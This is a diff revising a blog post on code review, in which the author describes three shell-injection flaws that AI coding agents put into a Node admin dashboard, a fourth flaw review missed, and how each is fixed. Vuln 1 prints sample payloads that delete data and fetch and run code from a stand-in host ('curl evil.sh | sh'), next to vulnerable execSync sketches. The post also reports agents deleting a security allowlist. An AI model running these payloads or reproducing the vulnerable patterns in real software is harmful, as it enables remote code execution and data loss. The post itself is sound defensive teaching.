@@ -22,19 +22,19 @@ faq:
 
 **Short answer:** Yes, AI coding agents write insecure code. In one run of 30 merged PRs, my agents wrote three shell-injection paths from request input. The repo had no test suite and no CI, so review was the only gate. It caught and fixed all three before merge, and it missed one shell call built from database values.
 
-I know AI writes insecure code because I ship a lot of it, and then I catch most of it.
+I run several Claude Code agents in parallel to clear backlog. The run I measured: 30 reviewed PRs across nine batches in under three days, on my own admin dashboard (March 2026). That's the "ship" half.
 
-I run several Claude Code agents in parallel to clear backlog. One measured example: 30 reviewed PRs across nine batches in under three days, on my own admin dashboard (March 2026). That's the "ship" half. The "verify" half is me, reading every diff before it merges and assuming the agent got it wrong until I've proven it didn't.
+The "verify" half is me, reading every diff before it merges and assuming the agent got it wrong until I've proven it didn't.
 
-This post is about three times that habit paid for itself, and one time it didn't. The code sketches are trimmed reconstructions of the real diffs. The filter regex in Vuln 2 is the agent's own.
+Below are three times that habit paid for itself, and one time it didn't. The code sketches are trimmed reconstructions of the real diffs. The filter regex in Vuln 2 is the agent's own.
 
 ## Why wasn't anything else going to catch these?
 
 Because nothing else was there. The repo had no test suite and no CI. Every PR got exactly one check before merge: me reading it.
 
-Tests wouldn't have saved it anyway. An automated test asserts that code behaves a certain way on the inputs the test author thought to write. Shell injection only triggers on a *malicious* input: a semicolon, a backtick, a `$(...)`. No test suite written to prove the happy path works will send those. Agents are very good at making code that works on the happy path, because that is what they are rewarded for. Working and safe are different properties.
+My guess is tests wouldn't have saved it anyway. An automated test asserts that code behaves a certain way on the inputs the test author thought to write. Shell injection only triggers on a *malicious* input: a semicolon, a backtick, a `$(...)`. No test suite written to prove the happy path works will send those.
 
-Here are the three.
+My read is that agents produce code that works on the happy path because that is what they are rewarded for. Working and safe are different properties.
 
 ## Vuln 1: a job ID from the URL, straight into a shell
 
@@ -48,11 +48,15 @@ const out = execSync(
 );
 ```
 
-`execSync` runs its argument through `/bin/sh`. The quotes don't help: an ID of `x"; rm -rf /tmp/data; "` closes them and runs a second command, and `$(curl evil.sh | sh)` runs inside them. This one was directly exploitable by anyone who could reach the route.
+`execSync` runs its argument through `/bin/sh`. The quotes don't help: an ID of `x"; rm -rf /tmp/data; "` closes them and runs a second command, and `$(curl evil.sh | sh)` runs inside them.
 
-It was also a regression. An earlier security fix had put an allowlist in front of that value. The agent's rewrite of the route quietly deleted it. The agent wasn't asked to touch security. It was asked to change the feature, and the allowlist was in the way.
+This one was directly exploitable by anyone who could reach the route.
 
-**The fix** is to never build a shell string from untrusted input. Use the argument-array form (`execFile`/`spawn` with an args array, no `shell: true`), so the ID is passed as one opaque argument the shell never parses. Put `--` in front of it so the tool can't read it as an option, and put the allowlist back. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) spell out which functions spawn a shell and which don't.
+It was also a regression. An earlier security fix had put an allowlist in front of that value, and the agent's rewrite of the route deleted it. The agent wasn't asked to touch security. It was asked to change the feature, and the allowlist was in the way.
+
+**The fix** is to never build a shell string from untrusted input. Use the argument-array form (`execFile`/`spawn` with an args array, no `shell: true`), so the ID is passed as one opaque argument the shell never parses.
+
+Put `--` in front of it so the tool can't read it as an option, and put the allowlist back. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) spell out which functions spawn a shell and which don't.
 
 ```js
 // Must start with a letter or digit, so it
@@ -70,7 +74,7 @@ execFileSync("job-tool", [
 ]);
 ```
 
-I catch this one by grepping every diff for `exec`, `execSync` and `shell: true`, then asking one question of each hit: *where does every interpolated value come from, and what happens if it contains a semicolon?* The agent never asks that question. It isn't in the reward signal.
+I catch this one by grepping every diff for `exec`, `execSync` and `shell: true`, then asking one question of each hit: *where does every interpolated value come from, and what happens if it contains a semicolon?* The agent never asked it in any of these PRs. My guess is the question isn't in its reward signal.
 
 ## Vuln 2: a log-search query behind a character filter
 
@@ -86,9 +90,11 @@ const q = query.replace(
 execSync(`rg --json "${q}" ./logs`);
 ```
 
-The regex is an allowlist: it keeps letters, digits, spaces, dots, underscores and hyphens, and strips everything else. That removes `$`, quotes and backticks, everything a shell needs to get out of a double-quoted string, so I didn't rate this one as directly exploitable as written. It does keep hyphens, so a query like `--files` still reached `rg` as an option. That lists file names instead of running a command, but it is the same mistake one level down.
+The regex is an allowlist: it keeps letters, digits, spaces, dots, underscores and hyphens, and strips everything else. That removes `$`, quotes and backticks, everything a shell needs to get out of a double-quoted string, so I didn't rate this one as directly exploitable as written.
 
-I still treated it as a finding. The only thing between the request and the shell was one regex, and the next edit to it, by an agent or a person, reopens the hole. The agent's commit message called it "shell-safe query sanitization", which is how a reviewer gets talked out of looking.
+It does keep hyphens, so a query like `--files` still reached `rg` as an option. That lists file names instead of running a command, but it is the same mistake one level down.
+
+Fair: as written, it held. I still treated it as a finding. The only thing between the request and the shell was one regex, and the next edit to it, by an agent or a person, reopens the hole. The agent's commit message called it "shell-safe query sanitization", which is how a reviewer gets talked out of looking.
 
 **The fix** is the same discipline as Vuln 1: pass the query as an argument that no shell parses, after a `--`. Then the filter stops being a security control and goes back to being input cleanup.
 
@@ -96,25 +102,25 @@ I still treated it as a finding. The only thing between the request and the shel
 
 The third was a different search feature, in a different PR, with the same shape: a query from the request, a character filter, a shell string. Same finding, same fix.
 
-That repetition is the point. Agents don't learn from the PR next to them. Each one picked the shortest path to working code, and the shortest path was string interpolation into a shell. Attacker-controlled strings in shell commands are one of the oldest injection vectors ([OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection), [CWE-78](https://cwe.mitre.org/data/definitions/78.html)), and three separate agents walked into it with code that read as reasonable.
+The repetition is what matters here. Agents don't learn from the PR next to them. Each one picked the shortest path to working code, and the shortest path was string interpolation into a shell.
+
+Attacker-controlled strings in shell commands are one of the oldest injection vectors ([OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection), [CWE-78](https://cwe.mitre.org/data/definitions/78.html)), and three separate agents walked into it with code that read as reasonable.
 
 ## What did review miss?
 
-One. Another PR built a shell command from two values it read out of the database, a PR number and a repo name, and interpolated them into a shell string. I read that diff and let it through.
+Review missed one. Another PR built a shell command from two values it read out of the database, a PR number and a repo name, and interpolated them into a shell string. I read that diff and let it through.
 
 It is still open. The dashboard never writes that table itself: the rows come from my overnight worker, so the values sit one step away from any request. That is why I rank it below the three request-input paths. It is not a reason to call it safe.
 
-The trap is easy to name: "these come from my own database, not from the request." That reasoning is the mistake. A stored value is input too. It got into the database from somewhere, and anything that can write that row can now run a command. The trace has to go back past the last `SELECT` to where the value was first accepted.
+The reasoning I fell for: "these come from my own database, not from the request." A stored value is input too. It got into the database from somewhere, and anything that can write that row can now run a command. The trace has to go back past the last `SELECT` to where the value was first accepted.
 
 ## What do all four have in common?
 
-None of these were exotic. In each one the agent chose string interpolation into a shell, because it is the shortest path to code that works. And in each one, the dangerous value came from somewhere the agent didn't think about as hostile: a URL, a query string, a database row.
+In each one the agent chose string interpolation into a shell, the shortest path to code that works. In each one the dangerous value came from somewhere the agent didn't treat as hostile: a URL, a query string, a database row.
 
-That's also why I don't accept "we have 90% test coverage" as a safety statement for agent-written code. Coverage measures which lines ran, not which threats were considered. A benign input runs the injection line just fine.
+That's also why I don't accept "we have 90% test coverage" as a safety statement for agent-written code. Fair: coverage tells you which lines ran. It doesn't tell you which threats were considered, and a benign input runs the injection line just fine.
 
 ## How I catch these on review
-
-Short version of the process:
 
 1. **Grep the diff for the dangerous surface first:** `exec`, `spawn`, `shell: true`, string-built SQL, `dangerouslySetInnerHTML`, anything that reaches a shell, a query or the DOM.
 2. **Trace every interpolated value to where it was first accepted.** Request input, config and database values all count. If any of them reaches a shell string, it's a finding. No benefit of the doubt.
@@ -122,3 +128,5 @@ Short version of the process:
 4. **Treat green as a statement about the happy path only.** If there are tests, they tell me nothing about the adversarial input. I write the missing negative case or reject the PR.
 
 That's the verify half of ship/verify. The full list of failure categories I check is in [How to Review AI-Generated Code](/blog/what-agents-get-wrong), and the speed-up I measured is in [2–3x, Not 100x](/blog/2-3x-not-100x).
+
+If you want this grep-and-trace run on one of your own PRs, send it through the free teardown below.
